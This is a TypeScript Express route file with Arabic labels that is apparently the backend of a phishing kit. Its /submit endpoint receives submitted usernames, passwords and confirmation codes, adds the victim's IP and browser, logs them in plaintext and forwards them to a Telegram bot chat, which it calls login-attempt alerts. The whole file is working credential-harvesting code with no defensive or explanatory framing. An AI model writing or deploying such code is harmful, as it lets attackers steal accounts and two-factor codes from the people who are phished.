import "dotenv/config";
import { Router, type IRouter, Request, Response } from "express";
import healthRouter from "./health";

const router: IRouter = Router();

router.use(healthRouter);

// ============================================
// 🔐 Endpoint لإرسال التنبيهات إلى تليجرام
// ============================================
router.post("/submit", async (req: Request, res: Response) => {
  console.log('📥 [1] Request received at /submit');
  console.log('📥 [2] Request headers:', req.headers);
  console.log('📥 [3] Request body:', req.body);
  
  try {
    const { username, password, timestamp, userAgent } = req.body;
    console.log('📥 [4] Extracted data:', { username, password, timestamp, userAgent });

    if (!username) {
      console.log('📥 [5] ❌ Username is missing');
      return res.status(400).json({ error: "Username is required" });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    console.log('📥 [6] Bot Token exists?', !!botToken);
    console.log('📥 [7] Chat ID exists?', !!chatId);

    if (!botToken || !chatId) {
      console.error("📥 [8] ❌ Telegram credentials not configured");
      return res.status(500).json({ error: "Telegram not configured" });
    }

    const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';
    console.log('📥 [9] IP:', ip);

    // بناء الرسالة بدون Markdown
    const isCode = username === "🔐 رمز التأكيد";
    const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
    const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";

    const message = `
${title}

👤 اسم المستخدم: ${username}
${label} ${password}
⏱️ الوقت: ${timestamp || new Date().toLocaleString()}
🌐 IP: ${ip}
📱 المتصفح: ${userAgent || 'غير معروف'}
    `;
    console.log('📥 [10] Message to send:', message);

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log('📥 [11] Sending to Telegram...');
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    console.log('📥 [12] Telegram response status:', response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("📥 [13] ❌ Telegram error:", errorText);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    console.log("📥 [14] ✅ Telegram notification sent for:", username);
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("📥 [15] ❌ Telegram alert error:", error);
    console.error("📥 [16] ❌ Error stack:", error.stack);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
